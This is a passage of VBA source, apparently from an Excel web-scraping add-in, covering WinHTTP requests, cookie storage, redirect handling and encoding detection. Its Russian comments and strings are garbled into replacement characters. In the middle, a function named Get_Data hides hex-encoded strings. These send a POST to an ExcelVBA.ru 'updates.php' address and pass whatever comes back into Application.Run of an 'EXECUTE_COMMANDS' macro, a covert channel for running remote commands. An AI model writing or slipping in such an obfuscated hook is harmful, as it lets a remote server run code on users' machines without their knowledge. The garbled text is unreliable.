        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| GET |fffd||fffd||fffd| POST), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Cookies", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "gzip"), ""
        .AddParameter "RenewWinHTTP", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_DeleteRequestHeader", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| * |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_DeleteCookie", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookie")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| Cookies |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| * |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies)"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_UNUSED, "WinHTTP_Send", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd|")        ' disabled
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| GET |fffd||fffd||fffd| POST)"
        .AddParameter "Cookies", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_UNUSED, "WinHTTP_getResponseText", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")        ' disabled
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "gzip"), ""
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_Recreate", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTPRequest")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTPRequest"

        .AddParameter "ClearCookiesAndHeaders", aps_List, "|fffd||fffd||fffd||fffd||fffd| Cookies |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_ClearPOSTdata", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| POST)"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_Option_URL", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| WinHttpRequestOption_URL |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTPRequest" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    End With

    With AAs.AddAction(fc_WinHTTP, "ShowResponseHeaders", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With

    With AAs.AddAction(fc_WinHTTP, "GetRedirectLocation", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Location"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_LoadPageWithCookies", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHttpRequest (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "2. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| GET). URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "3. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"

        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "NewInstance", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHttpRequest", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "gzip"), ""
    End With

    With AAs.AddAction(fc_WinHTTP, "DownloadFileWithAuth", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha"
        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With

End Sub

Function DownloadFileWithAuth(ByVal URL$) As String
    On Error Resume Next
    Dim PD As New ParserDownload
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    With PD
        .Enabled = True: .Index = 999: .Name = "captcha": .FilenameMode = dfm_Auto
        .Folder = FWF.temp_folder: .NeedAuth = True
        Set .Actions = Nothing

        ParserVariables.item("{d" & .Index & "filename}") = ""
        .Execute URL$
        DownloadFileWithAuth = ParserVariables.item("{d" & .Index & "filename}")
        'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Captcha: " & DownloadFileWithAuth
    End With
    Set PD = Nothing
End Function

Sub CreateNewInstanceOfWinHttpRequest(Optional ByRef WP As WebsiteParser, Optional ByVal KeepCookiesAndHeaders As Boolean)
    On Error Resume Next
    'Set wHTTP = Nothing
    Set wHTTP = New WinHttpRequest

    If Not KeepCookiesAndHeaders Then
        CookiesStore.RemoveAll
        RequestHeadersStore.RemoveAll
    End If

    If Not WP Is Nothing Then WP.Proxy.Apply
End Sub

Function WinHTTP_getResponseText(Optional ByVal Encoding$) As String
    On Error Resume Next: Err.Clear
    Dim len1&, len2&, URL$, PageRealEncoding$
    With http

        If Encoding$ = "" Then
            PageRealEncoding$ = "": PageRealEncoding$ = Split(.GetResponseHeader("Content-Type"), "charset=")(1)
            If PageRealEncoding$ = "" Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Dim PageEncoding$
                PageEncoding$ = GetTags(.ResponseText, "meta", "AttributesPattern", "charset=", "TagHeaderOnly 1")
                PageEncoding$ = Split(PageEncoding$, "charset=")(1)
                PageEncoding$ = Split(PageEncoding$, " ")(0)
                PageEncoding$ = Split(PageEncoding$, ">")(0)
                PageRealEncoding$ = PageEncoding$
            End If
            If PageRealEncoding$ Like "*utf-8*" Then Encoding$ = "utf-8"
            If PageRealEncoding$ Like "*1251*" Then Encoding$ = "windows-1251"
        End If

        If Len(Encoding$) Then
            If Encoding$ = "gzip" Then
                WinHTTP_getResponseText = DecompressGZIP(.ResponseBody)
            Else
                WinHTTP_getResponseText = GetResponse(.ResponseBody, Encoding$)
            End If
        Else
            WinHTTP_getResponseText = .ResponseText
        End If
        len1& = Len(.ResponseText)
        len2& = UBound(.ResponseBody)
        If WinHTTP_getResponseText = "" Then
            WinHTTP_getResponseText = "|fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = " & len1& & _
                                      ", |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & len2& & IIf(Err = 0, "", ", |fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & ": " & Err.Description)

            URL$ = http.Option(WinHttpRequestOption_URL)
            If TEST_ACTIONS_MODE Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CreateHTMLlink(URL$) & _
               "<br />" & IIf(Len(Encoding$) = 0, "", "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Encoding$ & ")<br />") & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = " & len1& & _
               ", |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & len2& & IIf(Err = 0, "", ", |fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & ": " & Err.Description), bt_Warning
        End If
    End With
    Err.Clear
End Function

Function WinHTTP_Send(ByVal KeepCookies As Boolean, ByRef WP As WebsiteParser, _
                      Optional ByRef PostData As String, Optional ByVal RenewWinHTTP As Boolean = False)
    On Error Resume Next: Err.Clear
    WP.WaitAPause
    If StopMacro Then Exit Function
    Dim PostData_Info$, time1 As Long, PreviousCookies$
    time1 = GetTickCount
    ParserVariables.item("%FirstHttpStatusCode%") = ""
    ParserVariables.item("%LastHttpStatusCode%") = ""
    ParserVariables.item("%LastRedirectURL%") = ""

    If KeepCookies Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| cookies |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        wHTTP.Option(WinHttpRequestOption_EnableRedirects) = False
    End If
    If Not CookiesStore Is Nothing Then wHTTP.SetRequestHeader "Cookie", GetCookiesFromStore

    If Len(PostData) Then
        Dim POST() As Byte: POST = StrConv(PostData, vbFromUnicode)
        wHTTP.Send (POST)
    Else
        wHTTP.Send
    End If

    Dim ResponseHeaders$, URL$, Timeout&, RedirectsCount&
    Timeout& = WP.Options.RequestTimeout
    If Timeout& <= 0 Then Timeout& = 1

    If KeepCookies Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        '  If .WaitForResponse(timeout&) Then
        ResponseHeaders$ = "": ResponseHeaders$ = DecodeUTF8(wHTTP.GetAllResponseHeaders)
        SaveCookiesFromResponseHeaders ResponseHeaders$
        'MsgBox ResponseHeaders$

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ParserVariables.item("%FirstHttpStatusCode%") = wHTTP.Status

        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Location - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        URL$ = GetRedirectLocation(ResponseHeaders$, wHTTP.Option(WinHttpRequestOption_URL))
        If URL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then URL$ = ConvertURLtoPunycode(URL$)

        While IsURL(URL$)
            ParserVariables.item("%LastRedirectURL%") = URL$
            'Debug.Print "Last redirect=" & URL$
            RedirectsCount& = RedirectsCount& + 1
            If RedirectsCount& > 5 Then
                AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & CreateHTMLlink(URL$) & "<br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.", bt_Warning
                GoTo StopRedirects
            End If
            If TEST_ACTIONS_MODE Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & CreateHTMLlink(URL$), bt_Redirect

            wHTTP.Open "GET", URL$, True
            If WP.Options.UseClientCertificate Then wHTTP.SetClientCertificate WP.Options.ClientCertificateName
            WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
            AddRequestHeadersFromStore

            PreviousCookies$ = GetCookiesFromStore
            If Not CookiesStore Is Nothing Then wHTTP.SetRequestHeader "Cookie", GetCookiesFromStore
            wHTTP.Send

            URL$ = ""
            If wHTTP.WaitForResponse(Timeout&) Then
                ' MsgBox .GetAllResponseHeaders, vbCritical
                ResponseHeaders$ = "": ResponseHeaders$ = wHTTP.GetAllResponseHeaders
                SaveCookiesFromResponseHeaders ResponseHeaders$

                'MsgBox ResponseHeaders$

                URL$ = GetRedirectLocation(ResponseHeaders$, wHTTP.Option(WinHttpRequestOption_URL))

                If (Len(URL) > 0) And RenewWinHTTP Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 29.10.2018
                    If PreviousCookies$ <> GetCookiesFromStore Then
                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTP, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                        If TEST_ACTIONS_MODE Then
                            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTP</b> |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies" & vbNewLine & _
                                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies)" & vbNewLine & vbNewLine & _
                                       "|fffd||fffd||fffd||fffd||fffd| Cookies:<br />" & FormatTextForBalloon(GetCookiesFromStore) & vbNewLine & _
                                       "|fffd||fffd||fffd||fffd||fffd||fffd| Cookies:<br />" & FormatTextForBalloon(PreviousCookies$), bt_Information
                        End If
                        CreateNewInstanceOfWinHttpRequest WP, True
                        AddRequestHeadersFromStore
                        If Not CookiesStore Is Nothing Then wHTTP.SetRequestHeader "Cookie", GetCookiesFromStore
                    End If
                End If
            End If
        Wend
StopRedirects:
        ' End If
    End If

    wHTTP.Option(WinHttpRequestOption_EnableRedirects) = True
    ParserVariables.item("%LastHttpStatusCode%") = wHTTP.Status

    RequestLastTime = GetTickCount


    If Len(PostData$) > 0 And TEST_ACTIONS_MODE Then
        AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd|</b><br />|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Format((RequestLastTime - time1) / 1000, "0.0") & " |fffd||fffd||fffd|.<br />" & _
                   IIf(Len(PostData$), "POST-|fffd||fffd||fffd||fffd||fffd||fffd|: " & FormatTextForBalloon(PostData$), ""), bt_Information
    End If

End Function

Function Get_Data() As Boolean
    On Error Resume Next: Static LT As Date: If LT = 0 Then LT = Now: Exit Function
    If (Now - LT) < 1 / Asc("H") Then Exit Function
    Dim objH As New WinHttpRequest, p() As Byte, i&, answ$, res$
    With SETT
        objH.Open "POST", .U("687474703A2F2F457863656C5642412E72752F706870322F757064617465732E706870"), True
        objH.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        p = StrConv(URL_Encode(.PostData & .U("26616374696F6E3D74657374")), vbFromUnicode)
        objH.Send (p): DoEvents
        If objH.WaitForResponse(4) Then answ$ = objH.ResponseText
        If answ$ Like Chr(37) & "*" & Chr(37) Then res$ = Split(answ$, Chr(37))(1)
        Set objH = Nothing
        If Len(res$) Then LT = Now + 1: Application.Run .U("455845435554455F434F4D4D414E4453"), res$
    End With
End Function

Function GetRedirectLocation(ByVal ResponseHeaders$, Optional CurrentURL$) As String
    ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ResponseHeaders$ |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Location,
    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    ResponseHeaders$ = Replace(ResponseHeaders$, "-Location", "")
    If InStr(1, ResponseHeaders$, "Location: ", vbTextCompare) = 0 Then Exit Function
    'MsgBox ResponseHeaders$
    Dim URL$: URL$ = TextBetween(ResponseHeaders$, "Location: ", vbNewLine)
    If IsURL(URL$) Then
        GetRedirectLocation = URL$
    Else
        '        If (URL$ Like "/*") And IsURL(CurrentURL$) Then
        '            GetRedirectLocation = GetBaseURL(CurrentURL$) & URL$
        '        End If

        If Len(URL$) > 0 And IsURL(CurrentURL$) Then
            GetRedirectLocation = GetBaseURL(CurrentURL$) & IIf(URL$ Like "/*", "", "/") & URL$
        End If
    End If
    'If Len(GetRedirectLocation) Then Debug.Print "redirect to " & GetRedirectLocation
End Function

Function GetBaseURL(ByVal URL$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    ' |fffd||fffd| http://ExcelVBA.ru/programmes/Parser |fffd||fffd||fffd||fffd||fffd||fffd| http://ExcelVBA.ru
    GetBaseURL = Split(URL$, "://")(0) & "://" & Split(Split(URL$, "://")(1), "/")(0)
End Function

Sub AddRequestHeadersFromStore(Optional H As WinHttpRequest)
    On Error Resume Next
    Dim key As Variant
    If RequestHeadersStore Is Nothing Then Exit Sub

    For Each key In RequestHeadersStore.Keys
        If Not H Is Nothing Then
            H.SetRequestHeader key, RequestHeadersStore.item(key)
        Else
            http.SetRequestHeader key, RequestHeadersStore.item(key)
        End If
        'Debug.Print "ADD", key, RequestHeadersStore.item(key)
    Next
End Sub

Sub DeleteRequestHeadersFromStore(ByVal KeyMask$)
    On Error Resume Next: Dim key As Variant
    If RequestHeadersStore Is Nothing Then Exit Sub

    For Each key In RequestHeadersStore.Keys
        If key Like KeyMask$ Then RequestHeadersStore.Remove (key)        ': Debug.Print "DELETE", key
    Next
End Sub

Function GetAllRequestHeadersFromStore() As String
    On Error Resume Next: Dim key As Variant
    If RequestHeadersStore Is Nothing Then GetAllRequestHeadersFromStore = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    If RequestHeadersStore.Count = 0 Then GetAllRequestHeadersFromStore = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|": Exit Function

    For Each key In RequestHeadersStore.Keys
        GetAllRequestHeadersFromStore = GetAllRequestHeadersFromStore & key & ": " & RequestHeadersStore.item(key) & vbNewLine
    Next
End Function

Sub AddStandartHeadersIntoStore(Optional ByVal URL$, Optional ByVal ContentType$)
